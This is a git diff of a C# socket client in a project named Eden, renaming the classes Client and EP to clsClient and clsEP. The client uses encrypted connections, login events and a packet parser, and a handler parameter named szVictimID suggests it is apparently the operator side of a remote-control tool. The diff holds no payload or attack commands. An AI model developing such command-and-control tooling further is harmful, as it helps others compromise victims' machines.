@@ -11,24 +11,24 @@ using System.Threading.Tasks;
 
 namespace Eden
 {
-    public class Client
+    public class clsClient
     {
         public delegate void StatusMessageHandler(int nCode = 0, string szMsg = null);
         public event StatusMessageHandler StatusMessage;
 
-        public delegate void SecureServerSocketEstablishedHandler(Client clnt);
+        public delegate void SecureServerSocketEstablishedHandler(clsClient clnt);
         public event SecureServerSocketEstablishedHandler SecureServerSocketEstablished;
-        public delegate void SecureServerSocketFailedHandler(Client clnt, string szMsg = null);
+        public delegate void SecureServerSocketFailedHandler(clsClient clnt, string szMsg = null);
         public event SecureServerSocketFailedHandler SecureServerSocketFailed;
-        public delegate void SocketDisconnectHandler(Client clnt, string szMsg = null);
+        public delegate void SocketDisconnectHandler(clsClient clnt, string szMsg = null);
         public event SocketDisconnectHandler SocketDisconnect;
 
-        public delegate void LoginSuccessfulHandler(Client clnt, string szUsername, int nAuthority);
+        public delegate void LoginSuccessfulHandler(clsClient clnt, string szUsername, int nAuthority);
         public event LoginSuccessfulHandler LoginSuccessful;
-        public delegate void LoginFailedHandler(Client clnt, string szUsername, string szMsg = null);
+        public delegate void LoginFailedHandler(clsClient clnt, string szUsername, string szMsg = null);
         public event LoginFailedHandler LoginFailed;
 
-        public delegate void ServerMessageReceivedHandler(Client clnt, string szVictimID, string[] aMsg);
+        public delegate void ServerMessageReceivedHandler(clsClient clnt, string szVictimID, string[] aMsg);
         public event ServerMessageReceivedHandler ServerMessageReceived;
 
         public Socket m_sktServ;
@@ -49,14 +49,14 @@ namespace Eden
         public DateTime m_dtLastLattency;
         public int m_nLattency = 0;
 
-        public Client(Socket sktServ)
+        public clsClient(Socket sktServ)
         {
             m_sktServ = sktServ;
             m_EZAES = new EZCrypto.EZAES();
             m_EZRSA = new EZCrypto.EZRSA();
         }
 
-        public Client()
+        public clsClient()
         {
             m_EZAES = new EZCrypto.EZAES();
             m_EZRSA = new EZCrypto.EZRSA();
@@ -93,7 +93,7 @@ namespace Eden
                 Socket socket = (Socket)ar.AsyncState;
                 socket.EndConnect(ar);
 
-                Client clnt = this;
+                clsClient clnt = this;
                 clnt.m_sktServ = socket;
                 socket.BeginReceive(clnt.m_abBuffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReceiveCallback), clnt);
 
@@ -113,11 +113,11 @@ namespace Eden
 
         public void ReceiveCallback(IAsyncResult ar)
         {
-            Client clnt = (Client)ar.AsyncState;
+            clsClient clnt = (clsClient)ar.AsyncState;
             try
             {
                 Socket socket = clnt.m_sktServ;
-                EP ep = null;
+                clsEP ep = null;
 
                 int nRecvLength = 0;
                 byte[] abStaticRecv = new byte[MAX_BUFFER_LENGTH];
@@ -127,21 +127,21 @@ namespace Eden
                 {
                     abStaticRecv = new byte[clsTools.MAX_BUFFER_LENGTH];
                     nRecvLength = socket.Receive(abStaticRecv);
-                    abDynamicRecv = EP.CombineBytes(abDynamicRecv, 0, abDynamicRecv.Length, abStaticRecv, 0, nRecvLength);
+                    abDynamicRecv = clsEP.CombineBytes(abDynamicRecv, 0, abDynamicRecv.Length, abStaticRecv, 0, nRecvLength);
 
                     if (nRecvLength <= 0)
                         break;
-                    else if (abDynamicRecv.Length < EP.HEADER_SIZE)
+                    else if (abDynamicRecv.Length < clsEP.HEADER_SIZE)
                         continue;
                     else
                     {
-                        var header_info = EP.GetHeader(abDynamicRecv);
-                        while (abDynamicRecv.Length - EP.HEADER_SIZE >= header_info.len)
+                        var header_info = clsEP.GetHeader(abDynamicRecv);
+                        while (abDynamicRecv.Length - clsEP.HEADER_SIZE >= header_info.len)
                         {
 
-                            ep = new EP(abDynamicRecv);
+                            ep = new clsEP(abDynamicRecv);
                             abDynamicRecv = ep.MoreData;
-                            header_info = EP.GetHeader(abDynamicRecv);
+                            header_info = clsEP.GetHeader(abDynamicRecv);
 
                             int nCmd = ep.Command;
                             int nParam = ep.Param;
@@ -250,7 +250,7 @@ namespace Eden
 
         public void Send(int nCmd, int nParam, byte[] abMsg, bool bAsync = true)
         {
-            byte[] abBuffer = new EP((byte)nCmd, (byte)nParam, abMsg).GetBytes();
+            byte[] abBuffer = new clsEP((byte)nCmd, (byte)nParam, abMsg).GetBytes();
             try
             {
                 if (bAsync)
